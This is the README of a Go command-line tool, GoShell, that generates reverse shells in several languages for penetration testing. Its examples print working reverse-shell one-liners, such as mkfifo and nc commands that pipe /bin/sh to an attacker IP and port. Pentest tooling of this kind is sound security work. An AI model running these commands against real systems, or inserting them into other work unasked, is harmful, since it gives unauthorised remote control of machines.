# GoShell
[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com) [![forthebadge](https://forthebadge.com/images/badges/you-didnt-ask-for-this.svg)](https://forthebadge.com)

Generate reverse shells in command line.

## Usage
This panel appears when typing `./goshell -h` :
```
USAGE:
   goshell [global options] command [command options] [arguments...]

COMMANDS:
   bash     Generate a Bash reverse shell
   nc       Generate NetCat reverse shells
   perl     Generate Perl reverse shells
   php      Generate a PHP reverse shell
   python   Generate a Python reverse shell
   ruby     Generate a Ruby reverse shell
   telnet   Generate a telnet reverse shell
   help, h  Shows a list of commands or help for one command

COMMAND OPTIONS:
   --ip value    (default: "127.0.0.1")
   --port value  (default: "8080")
   --help, -h    show help (default: false)

GLOBAL OPTIONS:
   --help, -h  show help (default: false)
```

## Examples
It is possible to provide the attacker IP address and listening port with the flags `-ip` and `-port`.
```
> ./goshell bash -ip 1.2.3.4 -port 1337                                                                                                            ~/dev/go/goshell
GoShell - (c)2020 - ezekiel
Note that those shells may not work on your target !

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 1337 >/tmp/f

> ./goshell nc                                                                                                                                 ~/dev/go/goshell
GoShell - (c)2020 - ezekiel
Note that those shells may not work on your target !

#1: nc -e /bin/sh 127.0.0.1 8080
#2: /bin/sh | nc 127.0.0.1 8080
#3: rm -f /tmp/p; mknod /tmp/p p && nc 127.0.0.1 8080 0/tmp/p
```

## Sources
* [highon.coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)